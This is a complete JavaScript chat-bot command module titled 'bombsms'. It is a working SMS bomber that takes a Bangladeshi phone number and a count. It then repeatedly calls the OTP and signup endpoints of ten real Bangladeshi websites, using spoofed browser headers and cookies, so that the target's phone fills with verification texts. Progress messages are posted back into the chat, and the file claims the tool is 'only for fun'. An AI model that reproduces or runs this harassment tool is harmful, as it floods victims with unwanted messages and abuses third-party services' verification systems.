
module.exports.config = {
  name: "bombsms",
  version: "2.0.0",
  hasPermssion: 0,
  credits: "Ahsan Habib - Bangladesh Cyber 2.0", // Original developer credit preserved
  description: "SMS বোম্বার বন্ধ করতে /bombsms off",
  commandCategory: "Tool",
  usages: "START -> /bombsms 01xxxxxxxxx limit | OFF --> /bombsms off",
  cooldowns: 0,
  dependencies: { "axios": "" }
};

const axios = require("axios");
const bombingFlags = {};

// Sleep function equivalent
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Slow writing function equivalent for bot messages
async function slw(text) {
    // For bot, we'll just return the text as we can't do character-by-character output
    return text;
}

module.exports.run = async ({ api, event, args }) => {
    const threadID = event.threadID;
    
    if (args[0] === "off") {
        if (bombingFlags[threadID]) {
            bombingFlags[threadID] = false;
            return api.sendMessage("✅ SMS বোম্বার বন্ধ করা হয়েছে।", threadID);
        } else {
            return api.sendMessage("❗এই থ্রেডে কোন বোম্বিং চলছিল না।", threadID);
        }
    }

    const num = args[0];
    const limitInput = args[1];
    
    if (!num || !limitInput) {
        const logo = `•┄┅════❁🌺❁════┅┄•

██████╗░░█████╗░░░░░░░██████╗░░░░░█████╗░
██╔══██╗██╔══██╗░░░░░░╚════██╗░░░██╔══██╗
██████╦╝██║░░╚═╝█████╗░░███╔═╝░░░██║░░██║
██╔══██╗██║░░██╗╚════╝██╔══╝░░░░░██║░░██║
██████╦╝╚█████╔╝░░░░░░███████╗██╗╚█████╔╝
╚═════╝░░╚════╝░░░░░░░╚══════╝╚═╝░╚════╝░

××××××××××××××××××××××××××××××××××××××××××××
DEVELOPER :Ahsan Habib 
GITHUB    : ahmhabib01
VERSION   : 1.0
PROJECT   : SMS BOMBER 
FACEBOOK  : Bangladesh Cyber 2.0
××××××××××××××××××××××××××××××××××××××××××××

ব্যবহার:
/bombsms 01xxxxxxxxx limit

উদাহরণ: /bombsms 01712345678 50

(বাংলাদেশি নাম্বার দিন, শুধু মজার জন্য ব্যবহার করুন)
বন্ধ করতে: /bombsms off

•┄┅════❁🌺❁════┅┄•`;
        return api.sendMessage(logo, threadID);
    }
    
    if (!/^01[0-9]{9}$/.test(num)) {
        return api.sendMessage("❌ সঠিক বাংলাদেশি নাম্বার দিন (01xxxxxxxxx ফরম্যাটে)", threadID);
    }
    
    const limit = parseInt(limitInput);
    if (isNaN(limit) || limit <= 0) {
        return api.sendMessage("❌ সঠিক সংখ্যা দিন (যেমন: 50)", threadID);
    }
    
    if (bombingFlags[threadID]) {
        return api.sendMessage("❗এই থ্রেডে ইতিমধ্যে বোম্বিং চলছে! বন্ধ করতে /bombsms off", threadID);
    }

    api.sendMessage(`✅ SMS বোম্বিং শুরু হয়েছে ${num} নম্বরে...
লক্ষ্য: ${limit} SMS
বন্ধ করতে /bombsms off`, threadID);

    bombingFlags[threadID] = true;

    // All the headers and data configurations from original code
    const headers = {
        'authority': 'www.bioscopelive.com',
        'accept': '*/*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'referer': 'https://www.bioscopelive.com/en/login',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    };
    
    const url1 = `https://www.bioscopelive.com/en/login/send-otp?phone=880${num}&operator=bd-otp`;
    
    const headers2 = {
        'referer': 'https://redx.com.bd/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const data1 = {
        'name': num,
        'phoneNumber': num,
        'service': 'redx',
    };
    
    const url2 = "https://api.redx.com.bd/v1/user/signup";
    
    const headers3 = {
        'authority': 'bikroy.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'bn',
        'application-name': 'web',
        'referer': 'https://bikroy.com/bn/users/login',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const url3 = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0" + num;
    
    const headers4 = {
        'authority': 'www.ieatery.com.bd',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'referer': 'https://www.ieatery.com.bd/login',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const url4 = "https://www.ieatery.com.bd/otp-verify?phn=0" + num;
    
    const headers5 = {
        'referer': 'https://doctime.com.bd/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const data2 = {
        'flag': 'https://doctime-core-ap-southeast-1.s3.ap-southeast-1.amazonaws.com/images/country-flags/flag-800.png',
        'code': '88',
        'contact_no': '0' + num,
        'country_calling_code': '88',
    };
    
    const headers6 = {
        'referer': 'https://osudpotro.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const data3 = {
        'mobile': '+88-0' + num,
        'deviceToken': 'web',
        'language': 'en',
        'os': 'web',
    };
    
    const headers7 = {
        'referer': 'https://osudpotro.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const data4 = {
        'mobile': '+88-0' + num,
        'deviceToken': 'web',
        'language': 'en',
        'os': 'web',
    };
    
    const headers8 = {
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Origin': 'https://hungrynaki.com',
        'Referer': 'https://hungrynaki.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
        'accept': '*/*',
        'content-type': 'application/json',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    };
    
    const data8 = {
        'operationName': 'createOtp',
        'variables': {
            'phone': "" + num,
            'country': '880',
            'uuid': '6fdb595b-a310-4f82-acca-a9b9c43e4eb0',
            'osVersionCode': 'Linux aarch64',
            'deviceBrand': 'Chrome',
            'deviceModel': '107',
            'requestFrom': 'U2FsdGVkX19u2nkZ5KMkGtpye/A3kpZfWKv3ylKExbM=',
        },
        'query': 'mutation createOtp($phone: PhoneNumber!, $country: String!, $uuid: String!, $osVersionCode: String, $deviceBrand: String, $deviceModel: String, $requestFrom: String) {\n  createOtp(auth: {phone: $phone, countryCode: $country, deviceUuid: $uuid, deviceToken: ""}, device: {deviceType: WEB, osVersionCode: $osVersionCode, deviceBrand: $deviceBrand, deviceModel: $deviceModel}, requestFrom: $requestFrom) {\n    statusCode\n  }\n}\n',
    };
    
    const cookies9 = {
        '_ga': 'GA1.3.1671188319.1677642641',
        '_gid': 'GA1.3.407134519.1677642641',
        '_gat_UA-146796176-2': '1',
        '_fbp': 'fb.2.1677642641903.2005162471',
        '_ga_5LF4359FD3': 'GS1.1.1677642640.1.1.1677642660.0.0.0',
    };
    
    const headers9 = {
        'authority': 'fundesh.com.bd',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://fundesh.com.bd',
        'referer': 'https://fundesh.com.bd/fundesh/profile',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const params9 = {
        'service_key': '',
    };
    
    const json_data9 = {
        'msisdn': '' + num,
    };
    
    const headers10 = {
        'Accept': '*/*',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Origin': 'https://ecourier.com.bd',
        'Referer': 'https://ecourier.com.bd/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    };
    
    const url10 = "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=0" + num;
    
    // Convert cookies object to cookie string
    const cookieString = Object.entries(cookies9).map(([key, value]) => `${key}=${value}`).join('; ');
    
    // Main bombing function - runs asynchronously
    (async function startBombing() {
        let ses = 0;
        let lastUpdate = 0;
        
        while (limit > ses && bombingFlags[threadID]) {
            try {
                const sent1 = await axios.get(url1, { headers: headers });
                if (sent1.status === 200) {
                    ses += 1;
                    if (ses - lastUpdate >= 10 || ses === 1) { // Update every 10 SMS
                        api.sendMessage(`✅ SMS পাঠানো হয়েছে: ${ses}/${limit} ♻️`, threadID);
                        lastUpdate = ses;
                    }
                }
            } catch (error) {
                // Continue on error - equivalent to Python's pass statement
            }
            
            if (!bombingFlags[threadID]) break;
            
            try {
                const sent2 = await axios.post(url2, data1, { headers: headers2 });
                if (sent2.status === 200) {
                    ses += 1;
                    if (ses - lastUpdate >= 10 || ses === 1) {
                        api.sendMessage(`✅ SMS পাঠানো হয়েছে: ${ses}/${limit} ♻️`, threadID);
                        lastUpdate = ses;
                    }
                }
            } catch (error) {
                // Continue on error
            }
            
            if (!bombingFlags[threadID]) break;
            
            try {
                const sent3 = await axios.get(url3, { headers: headers3 });
                if (sent3.status === 200) {
                    ses += 1;
                    if (ses - lastUpdate >= 10 || ses === 1) {
                        api.sendMessage(`✅ SMS পাঠানো হয়েছে: ${ses}/${limit} ♻️`, threadID);
                        lastUpdate = ses;
                    }
                }
            } catch (error) {
                // Continue on error
            }
            
            if (!bombingFlags[threadID]) break;
            
            try {
                const sent4 = await axios.get(url4, { headers: headers4 });
                if (sent4.status === 200) {
                    ses += 1;
                    if (ses - lastUpdate >= 10 || ses === 1) {
                        api.sendMessage(`✅ SMS পাঠানো হয়েছে: ${ses}/${limit} ♻️`, threadID);
                        lastUpdate = ses;
                    }
                }
            } catch (error) {
                // Continue on error
            }
            
            if (!bombingFlags[threadID]) break;
            
            try {
                const sent5 = await axios.post('https://admin.doctime.com.bd/api/authenticate', data2, { headers: headers5 });
                if (sent5.status === 200) {
                    ses += 1;
                    if (ses - lastUpdate >= 10 || ses === 1) {
                        api.sendMessage(`✅ SMS পাঠানো হয়েছে: ${ses}/${limit} ♻️`, threadID);
                        lastUpdate = ses;
                    }
                }
            } catch (error) {
                // Continue on error
            }
            
            if (!bombingFlags[threadID]) break;
            
            try {
                const sent6 = await axios.post('https://api.osudpotro.com/api/v1/users/send_otp', data3, { headers: headers6 });
                if (sent6.status === 200) {
                    ses += 1;
                    if (ses - lastUpdate >= 10 || ses === 1) {
                        api.sendMessage(`✅ SMS পাঠানো হয়েছে: ${ses}/${limit} ♻️`, threadID);
                        lastUpdate = ses;
                    }
                }
            } catch (error) {
                // Continue on error
            }
            
            if (!bombingFlags[threadID]) break;
            
            try {
                const sent7 = await axios.post('https://api.osudpotro.com/api/v1/users/send_otp', data4, { headers: headers7 });
                if (sent7.status === 200) {
                    ses += 1;
                    if (ses - lastUpdate >= 10 || ses === 1) {
                        api.sendMessage(`✅ SMS পাঠানো হয়েছে: ${ses}/${limit} ♻️`, threadID);
                        lastUpdate = ses;
                    }
                }
            } catch (error) {
                // Continue on error
            }
            
            if (!bombingFlags[threadID]) break;
            
            try {
                const sent8 = await axios.post('https://api-v4-1.hungrynaki.com/graphql', data8, { headers: headers8 });
                if (sent8.status === 200) {
                    ses += 1;
                    if (ses - lastUpdate >= 10 || ses === 1) {
                        api.sendMessage(`✅ SMS পাঠানো হয়েছে: ${ses}/${limit} ♻️`, threadID);
                        lastUpdate = ses;
                    }
                }
            } catch (error) {
                // Continue on error
            }
            
            if (!bombingFlags[threadID]) break;
            
            try {
                const sent9 = await axios.post(
                    'https://fundesh.com.bd/api/auth/generateOTP',
                    json_data9,
                    {
                        headers: { ...headers9, 'Cookie': cookieString },
                        params: params9
                    }
                );
                if (sent9.status === 200) {
                    ses += 1;
                    if (ses - lastUpdate >= 10 || ses === 1) {
                        api.sendMessage(`✅ SMS পাঠানো হয়েছে: ${ses}/${limit} ♻️`, threadID);
                        lastUpdate = ses;
                    }
                }
            } catch (error) {
                // Continue on error
            }
            
            if (!bombingFlags[threadID]) break;
            
            try {
                const sent10 = await axios.get(url10, { headers: headers10 });
                if (sent10.status === 200) {
                    ses += 1;
                    if (ses - lastUpdate >= 10 || ses === 1) {
                        api.sendMessage(`✅ SMS পাঠানো হয়েছে: ${ses}/${limit} ♻️`, threadID);
                        lastUpdate = ses;
                    }
                }
            } catch (error) {
                // Continue on error
            }
            
            // Small delay to prevent overwhelming the APIs
            await sleep(100);
        }
        
        // Final completion message
        if (bombingFlags[threadID]) {
            bombingFlags[threadID] = false;
            const completionMessage = `🎯 SMS বোম্বিং সম্পূর্ণ হয়েছে!

      ____  ____  _  ________
     / __ \\/ __ \\/ | / / ____/
    / / / / / / /  |/ / __/   
   / /_/ / /_/ / /|  / /___   
  /_____/\\____/_/ |_/_____/   
                            
 TNQ FOR USING OUR TOOLS 🖤🥰

মোট পাঠানো SMS: ${ses}/${limit}
লক্ষ্য নম্বর: ${num}

Developer: Ahsan Habib
Team: Bangladesh Cyber 2.0`;
            
            api.sendMessage(completionMessage, threadID);
        }
    })();
};

                        
